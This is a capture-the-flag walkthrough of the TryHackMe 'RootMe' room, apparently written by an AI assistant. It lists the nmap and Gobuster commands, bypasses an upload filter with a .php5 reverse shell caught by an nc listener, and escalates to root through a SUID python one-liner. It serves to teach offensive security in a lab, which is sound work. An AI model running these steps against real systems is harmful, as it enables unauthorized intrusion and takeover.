
# RootMe â€” TryHackMe Walkthrough
---

**Difficulty:** Easy
** Room **: RootMe ( THM )  
**Objective:** Gain initial access â†’ privilege escalate to root â†’ capture flags

---

## 1. Introduction

RootMe is one of TryHackMeâ€™s most popular beginner machines. It focuses on three core concepts:

1. Basic enumeration
2. File upload exploitation
3. Privilege escalation using SUID misconfiguration

This writeâ€‘up shows the exact steps used by the majority of solvers.

---

## 2. Reconnaissance

### ğŸ” 2.1 Nmap Scan

Scan the target to find open ports:

```bash
nmap -sC -sV -oN rootme_scan <TARGET_IP>
```

**Results (consistent with all public write-ups):**

* **22/tcp** â†’ SSH
* **80/tcp** â†’ HTTP (Apache 2.4.29)

The main attack surface is the web server on port 80.

---

### ğŸ” 2.2 Directory Enumeration

Using Gobuster:

```bash
gobuster dir -u http://<TARGET_IP> \
-w /usr/share/wordlists/dirb/common.txt
```

**Found directories:**

* `/panel/` â€” contains a file upload form
* `/uploads/` â€” uploaded files are stored here

These two directories form the basis of the initial exploit.

---

## 3. Exploiting the Upload Function

### ğŸ“¤ 3.1 Upload Bypass

The upload form blocks `.php` files but accepts alternative PHP extensions.

Verified working extension:
â¡ï¸ **.php5**

So we generate a PHP reverse shell (PentestMonkey PHP reverse shell is commonly used):

* Edit the IP and port in the shell
* Save it as:
  **shell.php5**

Upload it via `/panel/`.

---

### ğŸ¯ 3.2 Getting a Reverse Shell

Start listener:

```bash
nc -lvnp 4444
```

Then execute the uploaded shell:

```
http://<TARGET_IP>/uploads/shell.php5
```

You now receive a reverse shell.

---

### ğŸ”§ 3.3 Upgrade the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

```
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```

You now have a stable interactive shell.

---

## 4. User Flag

Locate the user flag:

```bash
find / -name user.txt 2>/dev/null
```

Common location reported by all write-ups:
â¡ï¸ `/var/www/user.txt`

Read it:

```bash
cat /var/www/user.txt
```

---

## 5. Privilege Escalation (Root)

### ğŸ” 5.1 Enumerate SUID Binaries

```bash
find / -type f -perm -4000 2>/dev/null
```

**Critical finding (confirmed in all THM write-ups):**
â¡ï¸ `/usr/bin/python` (or python2/3) has the SUID bit set
This is a serious misconfiguration.

---

### ğŸš€ 5.2 Exploit SUID Python

Use GTFObins method:

```bash
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

This opens a **root shell**.

---

### ğŸ” 5.3 Root Flag

```bash
cat /root/root.txt
```

Done â€” root privileges obtained.

---

## 6. Key Concepts Used

* **File upload bypass** with alternative PHP extension
* **Reverse shell** via PHP
* **SUID privilege escalation** using Python
* **Directory enumeration** via Gobuster

---

## 7. Final Notes

This machine is a perfect example of:

* Weak file validation
* Dangerous SUID configurations
* How small misconfigurations can lead to full system compromise

Itâ€™s beginner-friendly but teaches real-world vulnerabilities.

---

If you want, I can:

âœ… Format it in your exact Mr.Robot style
âœ… Add sections like â€œLessons Learnedâ€, â€œTechniques Summaryâ€, â€œAttack Path Diagramâ€
âœ… Generate a complete `.md` file ready for GitHub

Just tell me!

